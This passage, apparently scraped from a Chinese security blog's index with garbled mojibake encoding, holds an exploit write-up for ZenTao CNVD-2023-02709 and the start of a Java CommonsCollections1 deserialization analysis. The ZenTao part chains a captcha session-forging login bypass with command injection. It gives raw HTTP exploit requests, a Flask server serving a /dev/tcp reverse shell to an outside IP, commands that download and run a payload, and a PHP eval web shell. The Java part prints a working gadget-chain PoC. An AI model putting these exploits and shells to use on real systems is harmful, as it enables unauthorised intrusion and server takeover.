\u0026quot;?mode=getconfig\u0026quot;ï¼Œçœ‹æ˜¯å“ªç§\nå¯¹äºPATH_INFOâ€‹ï¼Œuriçš„å½¢å¼ä¸ºhttp://8.130.106.245:8080/misc-captcha-user\nå¯¹äºGETâ€‹ï¼Œuriçš„å½¢å¼ä¸ºhttp://8.130.106.245:8080/index.php?m=misc\u0026amp;f=captcha\u0026amp;sessionVar=user\nmè¡¨ç¤ºmoduleæ–‡ä»¶å¤¹ä¸‹çš„è·¯ç”±åå­—ï¼Œä¹Ÿå°±æ˜¯æ¨¡å‹åå­—\nfè¡¨ç¤ºcontorlé‡Œçš„å‡½æ•°ï¼Œåé¢çš„å‚æ•°å°±æ˜¯æŒ‡å‡½æ•°çš„å‚æ•°\n2.1 ç™»å½•ç»•è¿‡ 2.1.1 æ­£å¸¸ç™»å½•é€»è¾‘ ä½äºmodule/user/model.phpâ€‹çš„loginå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public function login($user, $addAction = true) { if(!$user) return false; $this-\u0026gt;cleanLocked($user-\u0026gt;account); /* Authorize him and save to session. */ $user-\u0026gt;rights = $this-\u0026gt;authorize($user-\u0026gt;account); $user-\u0026gt;groups = $this-\u0026gt;getGroups($user-\u0026gt;account); $user-\u0026gt;view = $this-\u0026gt;grantUserView($user-\u0026gt;account, $user-\u0026gt;rights[\u0026#39;acls\u0026#39;], $user-\u0026gt;rights[\u0026#39;projects\u0026#39;]); $user-\u0026gt;admin = strpos($this-\u0026gt;app-\u0026gt;company-\u0026gt;admins, \u0026#34;,{$user-\u0026gt;account},\u0026#34;) !== false; $this-\u0026gt;session-\u0026gt;set(\u0026#39;user\u0026#39;, $user); # æ³¨æ„è¿™é‡Œ $this-\u0026gt;app-\u0026gt;user = $this-\u0026gt;session-\u0026gt;user; if(isset($user-\u0026gt;id) and $addAction) $this-\u0026gt;loadModel(\u0026#39;action\u0026#39;)-\u0026gt;create(\u0026#39;user\u0026#39;, $user-\u0026gt;id, \u0026#39;login\u0026#39;); $this-\u0026gt;loadModel(\u0026#39;score\u0026#39;)-\u0026gt;create(\u0026#39;user\u0026#39;, \u0026#39;login\u0026#39;); /* Keep login. */ if($this-\u0026gt;post-\u0026gt;keepLogin) $this-\u0026gt;keepLogin($user); return $user; } ä½äºframework/base/router.class.phpâ€‹çš„setå‡½æ•°åœ¨debugè°ƒè¯•ä¸­\nå¯è§åœ¨æ­£å¸¸ç™»å½•æµç¨‹ä¸­ï¼Œç¦…é“ä¼šå°†ç”¨æˆ·ç™»å½•æ—¶ï¼Œå¯¹åº”çš„å›¾å½¢éªŒè¯ç ä½œä¸ºsessionä¸­å­—æ®µuserçš„å€¼ï¼Œ å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­\nå¹¶åœ¨cookieä¸­è¿”å›zentaosidï¼Œä½œä¸º session æ•°æ®çš„ç´¢å¼•\n2.1.2 ä¼ªé€ sessionå­—æ®µ ä½äºmodule/misc/control.phpâ€‹çš„captchaå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 public function captcha($sessionVar = \u0026#39;captcha\u0026#39;, $uuid = \u0026#39;\u0026#39;) { $obLevel = ob_get_level(); for($i = 0; $i \u0026lt; $obLevel; $i++) ob_end_clean(); header(\u0026#39;Content-Type: image/jpeg\u0026#39;); $captcha = $this-\u0026gt;app-\u0026gt;loadClass(\u0026#39;captcha\u0026#39;); $this-\u0026gt;session-\u0026gt;set($sessionVar, $captcha-\u0026gt;getPhrase()); # æ³¨æ„è¿™é‡Œ $captcha-\u0026gt;build()-\u0026gt;output(); } é€šè¿‡è®¿é—®http://8.130.106.245:8080/index.php?m=misc\u0026amp;f=captcha\u0026amp;sessionVar=userâ€‹ï¼Œå°†sessionVarâ€‹é€šè¿‡ä¼ å‚ï¼Œèµ‹å€¼ä¸ºuserï¼Œå¯ä»¥æ¨¡æ‹Ÿç™»å½•è¿‡ç¨‹ï¼Œåœ¨æœåŠ¡å™¨ä¸­ä¼ªé€ ä¸€ä¸ªsessionï¼Œå®ç°ç™»å½•ç»•è¿‡\n2.2 å‘½ä»¤æ‰§è¡Œ 2.2.1 execä¸æ„é€ å‡½æ•° ä½äºlib/scm/subversion.class.phpâ€‹çš„getSVNVersionâ€‹å‡½æ•°ï¼Œå­˜åœ¨è°ƒç”¨execå‡½æ•°ï¼Œæœ‰æœºä¼šåˆ©ç”¨\n1 2 3 4 5 6 7 8 public function getSVNVersion($client) { $versionCommand = \u0026#34;$client --version --quiet 2\u0026gt;\u0026amp;1\u0026#34;; exec($versionCommand, $versionOutput, $versionResult); if($versionResult) return false; return end($versionOutput); } çœ‹çœ‹è¿™ä¸ªæ–¹æ³•åœ¨å“ªé‡Œå¼•ç”¨äº†ï¼Œå‘ç°åŒphpæ–‡ä»¶é‡Œçš„Subversionæ„é€ å‡½æ•°æœ‰è°ƒç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public function __construct($client, $root, $account, $password, $encoding = \u0026#39;UTF-8\u0026#39;, $repo = null) { putenv(\u0026#39;LC_CTYPE=en_US.UTF-8\u0026#39;); $this-\u0026gt;root = str_replace(array(\u0026#39;%3A\u0026#39;, \u0026#39;%2F\u0026#39;, \u0026#39;+\u0026#39;), array(\u0026#39;:\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39; \u0026#39;), urlencode(rtrim($root, \u0026#39;/\u0026#39;))); $this-\u0026gt;account = $account; $this-\u0026gt;password = $password; $this-\u0026gt;encoding = $encoding; $this-\u0026gt;repo = $repo; $this-\u0026gt;ssh = (stripos($this-\u0026gt;root, \u0026#39;svn\u0026#39;) === 0 or stripos($this-\u0026gt;root, \u0026#39;https\u0026#39;) === 0) ? true : false; $this-\u0026gt;remote = !(stripos($this-\u0026gt;root, \u0026#39;file\u0026#39;) === 0); $this-\u0026gt;client = $this-\u0026gt;remote ? $client . \u0026#34; --username @account@ --password @password@\u0026#34; : $client; if($this-\u0026gt;encoding == \u0026#39;utf-8\u0026#39;) $this-\u0026gt;encoding = \u0026#39;gbk\u0026#39;; $this-\u0026gt;svnVersion = $this-\u0026gt;getSVNVersion($client); } å› æ­¤å°±éœ€è¦æ‰¾åˆ°è°ƒç”¨æ„é€ æ–¹æ³•çš„åœ°æ–¹\n2.2.2 setEngine æ ¹æ®è¯¥æ„é€ å‡½æ•°çš„å‚æ•°ç‰¹ç‚¹ï¼Œæ‰¾åˆ°ä½äºlib/scm/scm.class.phpâ€‹çš„setEngineå‡½æ•°è°ƒç”¨äº†è¯¥æ„é€ æ–¹æ³•\n1 2 3 4 5 6 7 public function setEngine($repo) { $className = $repo-\u0026gt;SCM; if($className == \u0026#39;Git\u0026#39;) $className = \u0026#39;GitRepo\u0026#39;; if(!class_exists($className)) require(strtolower($className) . \u0026#39;.class.php\u0026#39;); $this-\u0026gt;engine = new $className($repo-\u0026gt;client, $repo-\u0026gt;path, $repo-\u0026gt;account, $repo-\u0026gt;password, $repo-\u0026gt;encoding, $repo); } æ¥ä¸‹æ¥æ‰¾æœ‰å“ªé‡Œè°ƒç”¨äº†setEngineå‡½æ•°ï¼Œç­›é€‰æ¡ä»¶æ˜¯å‡½æ•°é€»è¾‘ç›¸å¯¹ç®€å•ï¼Œå‡½æ•°ä¼ å‚å¥½å®ç°ã€‚\nä¸¾ä¸€ä¸ªåä¾‹ï¼Œè¿™ç§repoå‚æ•°ï¼Œå¾ˆéš¾åœ¨postè¯·æ±‚ä¸­ä¼ è¿‡å»\n1 2 3 4 5 6 7 8 public function getRepoTags($repo) { if(empty($repo-\u0026gt;client) or empty($repo-\u0026gt;path) or !isset($repo-\u0026gt;account) or !isset($repo-\u0026gt;password) or !isset($repo-\u0026gt;encoding)) return false; $scm = $this-\u0026gt;app-\u0026gt;loadClass(\u0026#39;scm\u0026#39;); $scm-\u0026gt;setEngine($repo); return $scm-\u0026gt;tags(\u0026#39;\u0026#39;); } 2.2.3 updateä¸edit ä½äºmodule/repo/model.phpâ€‹çš„updateå‡½æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public function update($id) { $repo = $this-\u0026gt;getRepoByID($id); if(!$this-\u0026gt;checkConnection()) return false; $isPipelineServer = in_array(strtolower($this-\u0026gt;post-\u0026gt;SCM), $this-\u0026gt;config-\u0026gt;repo-\u0026gt;gitServiceList) ? true : false; $data = fixer::input(\u0026#39;post\u0026#39;) -\u0026gt;setIf($isPipelineServer, \u0026#39;password\u0026#39;, $this-\u0026gt;post-\u0026gt;serviceToken) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;, \u0026#39;path\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;, \u0026#39;client\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;, \u0026#39;extra\u0026#39;, $this-\u0026gt;post-\u0026gt;serviceProject) -\u0026gt;setDefault(\u0026#39;prefix\u0026#39;, $repo-\u0026gt;prefix) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;, \u0026#39;prefix\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;setDefault(\u0026#39;client\u0026#39;, \u0026#39;svn\u0026#39;) -\u0026gt;setDefault(\u0026#39;product\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;skipSpecial(\u0026#39;path,client,account,password\u0026#39;) -\u0026gt;join(\u0026#39;product\u0026#39;, \u0026#39;,\u0026#39;) -\u0026gt;setDefault(\u0026#39;projects\u0026#39;, \u0026#39;\u0026#39;)-\u0026gt;join(\u0026#39;projects\u0026#39;, \u0026#39;,\u0026#39;) -\u0026gt;get(); if($data-\u0026gt;path != $repo-\u0026gt;path) $data-\u0026gt;synced = 0; $data-\u0026gt;acl = empty($data-\u0026gt;acl) ? \u0026#39;\u0026#39; : json_encode($data-\u0026gt;acl); if($data-\u0026gt;SCM == \u0026#39;Subversion\u0026#39; and $data-\u0026gt;path != $repo-\u0026gt;path) { $scm = $this-\u0026gt;app-\u0026gt;loadClass(\u0026#39;scm\u0026#39;); $scm-\u0026gt;setEngine($data); /*....ä¸å…³é”®ä»£ç ....*/ } åªè¦postä¼ å‚if($data-\u0026gt;SCM == 'Subversion' and $data-\u0026gt;path != $repo-\u0026gt;path)ä¸ºçœŸå³å¯\næ ¹æ®mvcæ¡†æ¶ï¼Œmodelå±‚çš„å‡½æ•°æ—¶è®¿é—®ä¸äº†çš„ï¼Œæ‰€ä»¥å¾—æ‰¾ä¸€ä¸ªcontrolå±‚çš„ï¼Œè°ƒç”¨updateçš„å‡½æ•°\nä½äºmodule/repo/control.phpâ€‹çš„å‡½æ•°edit\n1 2 3 4 5 6 7 8 9 10 11 public function edit($repoID, $objectID = 0) { $this-\u0026gt;commonAction($repoID, $objectID); $repo = $this-\u0026gt;repo-\u0026gt;getRepoByID($repoID); if($_POST) { $noNeedSync = $this-\u0026gt;repo-\u0026gt;update($repoID); /*....ä¸å…³é”®ä»£ç .....*/ } 2.2.3 æ„é€ ä¸€ä¸ªrepo ä¸ºäº†å®ç°ä¸Šè¿°åˆ©ç”¨é“¾ï¼Œè¿˜éœ€æ„é€ ä¸€ä¸ªrepoï¼Œä½¿setEngineå‡½æ•°æ‰§è¡Œæ—¶ï¼Œèƒ½æœ‰ä¸€ä¸ªrepoç”¨\nä½äºmodule/repo/control.phpâ€‹çš„å‡½æ•°create\n1 2 3 4 5 6 7 8 public function create($objectID = 0) { if($_POST) { $repoID = $this-\u0026gt;repo-\u0026gt;create(); /*............*/ } è°ƒç”¨ä½äºmodule/repo/model.phpâ€‹çš„å‡½æ•°create\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 public function create() { if(!$this-\u0026gt;checkClient()) return false; if(!$this-\u0026gt;checkConnection()) return false; $isPipelineServer = in_array(strtolower($this-\u0026gt;post-\u0026gt;SCM), $this-\u0026gt;config-\u0026gt;repo-\u0026gt;gitServiceList) ? true : false; $data = fixer::input(\u0026#39;post\u0026#39;) -\u0026gt;setIf($isPipelineServer, \u0026#39;password\u0026#39;, $this-\u0026gt;post-\u0026gt;serviceToken) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;, \u0026#39;path\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;, \u0026#39;client\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;, \u0026#39;extra\u0026#39;, $this-\u0026gt;post-\u0026gt;serviceProject) -\u0026gt;setIf($isPipelineServer, \u0026#39;prefix\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Git\u0026#39;, \u0026#39;account\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;setIf($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Git\u0026#39;, \u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;skipSpecial(\u0026#39;path,client,account,password\u0026#39;) -\u0026gt;setDefault(\u0026#39;product\u0026#39;, \u0026#39;\u0026#39;) -\u0026gt;join(\u0026#39;product\u0026#39;, \u0026#39;,\u0026#39;) -\u0026gt;setDefault(\u0026#39;projects\u0026#39;, \u0026#39;\u0026#39;)-\u0026gt;join(\u0026#39;projects\u0026#39;, \u0026#39;,\u0026#39;) -\u0026gt;get(); $data-\u0026gt;acl = empty($data-\u0026gt;acl) ? \u0026#39;\u0026#39; : json_encode($data-\u0026gt;acl); if($data-\u0026gt;SCM == \u0026#39;Subversion\u0026#39;) { $scm = $this-\u0026gt;app-\u0026gt;loadClass(\u0026#39;scm\u0026#39;); $scm-\u0026gt;setEngine($data); $info = $scm-\u0026gt;info(\u0026#39;\u0026#39;); $infoRoot = urldecode($info-\u0026gt;root); $data-\u0026gt;prefix = empty($infoRoot) ? \u0026#39;\u0026#39; : trim(str_ireplace($infoRoot, \u0026#39;\u0026#39;, str_replace(\u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, $data-\u0026gt;path)), \u0026#39;/\u0026#39;); if($data-\u0026gt;prefix) $data-\u0026gt;prefix = \u0026#39;/\u0026#39; . $data-\u0026gt;prefix; } if($data-\u0026gt;encrypt == \u0026#39;base64\u0026#39;) $data-\u0026gt;password = base64_encode($data-\u0026gt;password); $this-\u0026gt;dao-\u0026gt;insert(TABLE_REPO)-\u0026gt;data($data, $skip = \u0026#39;serviceToken\u0026#39;) -\u0026gt;batchCheck($this-\u0026gt;config-\u0026gt;repo-\u0026gt;create-\u0026gt;requiredFields, \u0026#39;notempty\u0026#39;) -\u0026gt;batchCheckIF($data-\u0026gt;SCM != \u0026#39;Gitlab\u0026#39;, \u0026#39;path,client\u0026#39;, \u0026#39;notempty\u0026#39;) -\u0026gt;batchCheckIF($isPipelineServer, \u0026#39;serviceHost,serviceProject\u0026#39;, \u0026#39;notempty\u0026#39;) -\u0026gt;batchCheckIF($data-\u0026gt;SCM == \u0026#39;Subversion\u0026#39;, $this-\u0026gt;config-\u0026gt;repo-\u0026gt;svn-\u0026gt;requiredFields, \u0026#39;notempty\u0026#39;) -\u0026gt;check(\u0026#39;name\u0026#39;, \u0026#39;unique\u0026#39;, \u0026#34;`SCM` = \u0026#39;{$data-\u0026gt;SCM}\u0026#39;\u0026#34;) -\u0026gt;checkIF($isPipelineServer, \u0026#39;serviceProject\u0026#39;, \u0026#39;unique\u0026#39;, \u0026#34;`SCM` = \u0026#39;{$data-\u0026gt;SCM}\u0026#39; and `serviceHost` = \u0026#39;{$data-\u0026gt;serviceHost}\u0026#39;\u0026#34;) -\u0026gt;checkIF(!$isPipelineServer, \u0026#39;path\u0026#39;, \u0026#39;unique\u0026#39;, \u0026#34;`SCM` = \u0026#39;{$data-\u0026gt;SCM}\u0026#39; and `serviceHost` = \u0026#39;{$data-\u0026gt;serviceHost}\u0026#39;\u0026#34;) -\u0026gt;autoCheck() -\u0026gt;exec(); if(dao::isError()) return false; $this-\u0026gt;rmClientVersionFile(); $repoID = $this-\u0026gt;dao-\u0026gt;lastInsertID(); if($this-\u0026gt;post-\u0026gt;SCM == \u0026#39;Gitlab\u0026#39;) { /* Add webhook. */ $repo = $this-\u0026gt;getRepoByID($repoID); $this-\u0026gt;loadModel(\u0026#39;gitlab\u0026#39;)-\u0026gt;addPushWebhook($repo); } return $repoID; } é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºä¸€ä¸ªrepoï¼Œå…·ä½“è§PoC\nä¸‰ã€PoC 3.1 ä¼ªé€ session 1 2 3 4 5 6 7 8 9 10 GET /misc-captcha-user HTTP/1.1 Host: 8.130.106.245:8080 Accept-Language: zh-CN,zh;q=0.9 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 HTTP_SEC_FETCH_DEST: frame Referer:http://8.130.106.245:8080/index.php?m=user\u0026amp;f=login\u0026amp;referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM= Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Content-Length: 2 3.2 åˆ›å»ºrepo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 POST /repo-create.html HTTP/1.1 Host: 8.130.106.245:8080 Accept-Language: zh-CN,zh;q=0.9 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Referer:http://8.130.106.245:8080/index.php?m=user\u0026amp;f=login\u0026amp;referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM= Cookie: zentaosid=898j16uh93p7kvvca97uget3fu; lang=zh-cn; device=desktop; theme=default Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 39 SCM=Gitlab\u0026amp;name=hacker1\u0026amp;product=hacker1 3.3 å‘½ä»¤æ‰§è¡Œ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /repo-edit-22 HTTP/1.1 Host: 8.130.106.245:8080 Accept-Language: zh-CN,zh;q=0.9 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Referer:http://8.130.106.245:8080/index.php?m=user\u0026amp;f=login\u0026amp;referer=L2luZGV4LnBocD9tPXJlcG8mZj1jcmVhdGUmX3NpbmdsZT0xMjM= X-Requested-With: XMLHttpRequest Cookie: zentaosid=898j16uh93p7kvvca97uget3fu; lang=zh-cn; device=desktop; theme=default; windowWidth=1024; windowHeight=924 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 28 SCM=Subversion\u0026amp;client=\u0026#39;pwd\u0026#39;; å››ã€EXP 4.0 å‰è¨€ åœ¨PoCä¸­å‘ç°ï¼Œç›´æ¥åå¼¹shellå¹¶ä¸è¡Œï¼Œæ•…å°è¯•åˆ«çš„æ–¹æ¡ˆ\n4.1 getshell æ­å»ºflaskæœåŠ¡\n1 2 3 4 5 6 7 8 9 from flask import Flask, redirect app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def root(): return \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/8.140.232.215/33113 0\u0026gt;\u0026amp;1\u0026#39; if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=80) ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸‹å·¥å…·https://github.com/0xf4n9x/Zentao-Captcha-RCE\n1 2 3 cnvd-2023-02709.exe -u http://8.130.106.245:8080/ -c \u0026#34;curl 8.140.232.215:80 -o /tmp/moxbbzz\u0026#34; cnvd-2023-02709.exe -u http://8.130.106.245:8080/ -c \u0026#34;chmod +x /tmp/moxbbzz\u0026#34; cnvd-2023-02709.exe -u http://8.130.106.245:8080/ -c \u0026#34;/bin/bash /tmp/moxbbzz\u0026#34; 4.2 æ¤å…¥æœ¨é©¬ 1 echo \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39; \u0026gt; shell.php ","date":"2025-12-17T01:17:28+08:00","permalink":"https://lantern-lab.github.io/post/zentao-cnvd202302709-8wri8.html","title":"ç¦…é“CNVD-2023-02709"},{"content":"ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾ Javaååºåˆ—åŒ– ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– å¦‚æœæˆ‘ä»¬éœ€è¦æŒä¹…åŒ– Java å¯¹è±¡æ¯”å¦‚å°† Java å¯¹è±¡ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæˆ–è€…åœ¨ç½‘ç»œä¼ è¾“ Java å¯¹è±¡ï¼Œè¿™äº›åœºæ™¯éƒ½éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ã€‚\nåºåˆ—åŒ–ï¼šå°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡è½¬æ¢æˆäºŒè¿›åˆ¶å­—èŠ‚æµçš„è¿‡ç¨‹ ååºåˆ—åŒ–ï¼šå°†åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ç”Ÿæˆçš„äºŒè¿›åˆ¶å­—èŠ‚æµè½¬æ¢æˆæ•°æ®ç»“æ„æˆ–è€…å¯¹è±¡çš„è¿‡ç¨‹ ä¸‹é¢æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¸¸è§åº”ç”¨åœºæ™¯ï¼š\nå¯¹è±¡åœ¨è¿›è¡Œç½‘ç»œä¼ è¾“ï¼ˆæ¯”å¦‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ RPC çš„æ—¶å€™ï¼‰ä¹‹å‰éœ€è¦å…ˆè¢«åºåˆ—åŒ–ï¼Œæ¥æ”¶åˆ°åºåˆ—åŒ–çš„å¯¹è±¡ä¹‹åéœ€è¦å†è¿›è¡Œååºåˆ—åŒ–ï¼› å°†å¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶ä¹‹å‰éœ€è¦è¿›è¡Œåºåˆ—åŒ–ï¼Œå°†å¯¹è±¡ä»æ–‡ä»¶ä¸­è¯»å–å‡ºæ¥éœ€è¦è¿›è¡Œååºåˆ—åŒ–ï¼› å°†å¯¹è±¡å­˜å‚¨åˆ°æ•°æ®åº“ï¼ˆå¦‚ Redisï¼‰ä¹‹å‰éœ€è¦ç”¨åˆ°åºåˆ—åŒ–ï¼Œå°†å¯¹è±¡ä»ç¼“å­˜æ•°æ®åº“ä¸­è¯»å–å‡ºæ¥éœ€è¦ååºåˆ—åŒ–ï¼› å°†å¯¹è±¡å­˜å‚¨åˆ°å†…å­˜ä¹‹å‰éœ€è¦è¿›è¡Œåºåˆ—åŒ–ï¼Œä»å†…å­˜ä¸­è¯»å–å‡ºæ¥ä¹‹åéœ€è¦è¿›è¡Œååºåˆ—åŒ–ã€‚ ç»¼ä¸Šï¼šåºåˆ—åŒ–çš„ä¸»è¦ç›®çš„æ˜¯é€šè¿‡ç½‘ç»œä¼ è¾“å¯¹è±¡æˆ–è€…è¯´æ˜¯å°†å¯¹è±¡å­˜å‚¨åˆ°æ–‡ä»¶ç³»ç»Ÿã€æ•°æ®åº“ã€å†…å­˜ä¸­ã€‚\nâ€‹â€‹\nCommonsCollections1 ç‰ˆæœ¬é€‚ç”¨èŒƒå›´ Commons-Collections 3.1-3.2.1\nJava JDK \u0026lt; 8u71\nTransformerMapé“¾ PoCå±•ç¤º è¿™æ˜¯ä¸€æ®µPoCï¼Œè¿è¡Œåä¼šå¼¹å‡ºä¸€ä¸ªè®¡ç®—å™¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example.cc; import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç  Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] {\u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] {String.class }, new Object[] {\u0026#34;calc.exe\u0026#34;}) }; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±» Transformer transformerChain = new ChainedTransformer(transformers); //åˆ›å»ºMapå¹¶ç»‘å®štransformerChina HashMap\u0026lt;Object, Object\u0026gt; innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;hack\u0026#34;); //ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾ Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //è§¦å‘æ¼æ´ onlyElement.setValue(\u0026#34;foobar\u0026#34;); } } PoCè°ƒç”¨åˆ†æ å…ˆdebugçœ‹çœ‹è°ƒç”¨é“¾ï¼Œæ•´ä¸ªè¿‡ç¨‹ä»onlyElement.setValue(\u0026quot;foobar\u0026quot;)â€‹å¼€å§‹ï¼Œæ¯æ®µä»£ç åªå–ç›¸å…³çš„ç‰‡æ®µã€‚\næºç çš„æ³¨é‡Šéœ€è¦ä¸‹è½½CommonsCollectionsæºç æŸ¥çœ‹ï¼Œdebugæ—¶æ˜¯æ²¡æœ‰çš„ã€‚\nAbstractInputCheckedMapDecorator 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // org. apache. commons. collections. map. AbstractInputCheckedMapDecorator protected abstract Object checkSetValue(Object var1);//3 /** * Implementation of a map entry that checks additions via setValue. */ static class MapEntry extends AbstractMapEntryDecorator { private final AbstractInputCheckedMapDecorator parent; /** The parent map */ protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) {//1 value = this.parent.checkSetValue(value);//2 return this.entry.setValue(value); } } å¦‚ä»£ç æ³¨é‡Šé‡Œçš„é¡ºåºæ‰€ç¤ºï¼Œç¨‹åºå…ˆåˆ°AbstractInputCheckedMapDecoratorçš„å­ç±»MapEntryï¼Œåœ¨2å¤„è°ƒç”¨3å¤„çš„checkSetValueï¼Œä½†æ˜¯è¿™é‡Œçš„checkSetValueæ˜¯æŠ½è±¡å‡½æ•°ï¼Œç¨‹åºè¿è¡Œæ—¶ä¼šæ ¹æ®å®ä¾‹è°ƒç”¨å¯¹åº”çš„å®ç°ã€‚\ncheckSetValueå¯¹åº”çš„å®ç°æœ‰ä¸¤ä¸ªå¦‚ä¸‹ï¼š\nâ€‹â€‹\næ ¹æ®PoCçš„ä»£ç ï¼Œè¿™é‡Œä¼šæ‰§è¡ŒTransformMapé‡Œå®šä¹‰çš„checkSetValueã€‚\nTransformedMap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // org. apache. commons. collections. map. TransformedMap extends AbstractInputCheckedMapDecorator // protected final Transformer keyTransformer; protected final Transformer valueTransformer; /** * Factory method to create a transforming map. * \u0026lt;p\u0026gt; * If there are any elements already in the map being decorated, they * are NOT transformed. * Constrast this with {@link #decorateTransform}. * * @param map the map to decorate, must not be null * @param keyTransformer the transformer to use for key conversion, null means no transformation * @param valueTransformer the transformer to use for value conversion, null means no transformation * @throws IllegalArgumentException if map is null */ public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); } /** * Constructor that wraps (not copies). */ protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } /** * Override to transform the value when using \u0026lt;code\u0026gt;setValue\u0026lt;/code\u0026gt;. * * @param value the value to transform * @return the 